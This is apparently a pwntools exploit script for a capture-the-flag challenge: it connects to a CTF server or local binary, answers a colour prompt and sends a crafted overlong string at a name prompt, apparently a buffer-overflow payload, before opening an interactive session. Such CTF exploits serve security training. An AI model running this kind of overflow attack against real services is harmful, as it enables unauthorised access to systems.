from pwn import *

local = False

if local:
    p = process("./chall")
    input("gdb")
else:
    p = remote("tjc.tf", 31453)


m = p.recvuntil(b"(format: r, g, b)\n")
p.sendline(b"1, 1, 1")

m = p.recvuntil(b"name?")

payload = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJK4T2OPQRSTUVWXYZ123456789"
p.sendline(payload)

p.interactive()
